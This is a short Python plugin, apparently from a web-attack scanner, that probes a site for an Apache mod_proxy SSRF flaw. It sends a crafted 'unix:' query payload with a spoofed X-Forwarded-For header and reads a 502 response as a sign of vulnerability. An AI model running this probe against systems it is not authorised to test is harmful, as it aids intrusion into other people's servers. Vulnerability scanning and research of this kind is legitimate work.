import requests
from core.printmodels import *

class Apache_ModProxy_SSRF:
    def __init__(self):
        self.name = "Apache mod_proxy SSRF"
        self.description = "Apache HTTP Server mod_proxy SSRF"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {"X-Forwarded-For": "127.0.0.1"}
            payload = f"{site}/?unix:AAAAAAAAAAAAAAA|"
            
            response = requests.get(payload, headers=headers, verify=False, timeout=10)
            if response.status_code == 502:
                return PrintSuccess(f"[Apache-ModProxy] Potentially vulnerable to SSRF!")
            return PrintFailed("[Apache-ModProxy] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Apache-ModProxy] Error: {str(e)}")
